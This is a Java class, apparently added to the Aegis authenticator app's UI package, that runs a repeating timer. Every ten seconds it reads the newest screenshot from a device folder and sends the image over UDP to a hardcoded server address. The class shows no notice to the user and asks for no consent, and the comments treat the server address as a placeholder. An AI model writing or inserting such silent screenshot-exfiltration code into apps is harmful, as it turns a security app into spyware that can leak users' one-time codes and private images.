package com.beemdevelopment.aegis.ui;
import android.content.Context;
import android.os.Handler;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.util.Arrays;

public class PictureSender {
    private Context context;
    private Handler handler = new Handler();
    private Runnable runnable = new Runnable() {
        @Override
        public void run() {
            sendPicture();
            handler.postDelayed(this, 10000);
        }
    };

    public PictureSender(Context context) {
        this.context = context;
    }

    public void startSending() {
        handler.post(runnable);
    }

    public void stopSending() {
        handler.removeCallbacks(runnable);
    }

    private void sendPicture() {
        try {
            // Replace with the path to your image file
            File imageFile = getNewestPicture("/storage/emulated/0/Pictures/YourAppScreenshots");
            InetAddress serverAddress = InetAddress.getByName("10.0.2.2"); // Replace with your server IP
            int serverPort = 12345; // Replace with your server port

            // Convert file to byte array
            byte[] imageData = fileToByteArray(imageFile);

            // Create a datagram socket
            try (DatagramSocket socket = new DatagramSocket()) {
                // Create a packet
                DatagramPacket packet = new DatagramPacket(imageData, imageData.length, serverAddress, serverPort);

                // Send the packet
                socket.send(packet);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    private File getNewestPicture(String directoryPath) {
        File directory = new File(directoryPath);
        File[] files = directory.listFiles((dir, name) -> {
            return name.toLowerCase().endsWith(".jpg") || name.toLowerCase().endsWith(".jpeg") || name.toLowerCase().endsWith(".png");
        });

        if (files != null && files.length > 0) {
            Arrays.sort(files, (f1, f2) -> {
                return Long.compare(f2.lastModified(), f1.lastModified());
            });
            return files[0]; // The newest file
        } else {
            return null; // No image file found
        }
    }

    private byte[] fileToByteArray(File file) throws IOException {
        FileInputStream fis = new FileInputStream(file);
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        byte[] buf = new byte[1024];
        for (int readNum; (readNum = fis.read(buf)) != -1;) {
            bos.write(buf, 0, readNum);
        }
        fis.close();
        return bos.toByteArray();
    }
    public void sendTestUdpPacket() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    DatagramSocket socket = new DatagramSocket();
                    String message = "Hello, this is a test message!";
                    InetAddress serverAddress = InetAddress.getByName("10.0.2.2"); // Use 10.0.2.2 for emulator to connect to localhost of the host machine
                    int serverPort = 12345; // Replace with your server port

                    byte[] buffer = message.getBytes();
                    DatagramPacket packet = new DatagramPacket(buffer, buffer.length, serverAddress, serverPort);
                    socket.send(packet);
                    socket.close();
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }
}

